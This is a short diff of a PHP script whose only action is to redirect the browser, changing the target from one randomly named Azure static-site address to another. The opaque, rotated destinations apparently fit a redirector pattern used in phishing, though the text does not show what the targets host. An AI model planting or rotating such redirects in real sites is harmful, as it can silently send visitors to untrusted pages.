@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://cen57in76do97fixxx.z29.web.core.windows.net/");
+header("Location: https://kind-grass-05e10c200.4.azurestaticapps.net/");
  
 exit;
 ?>
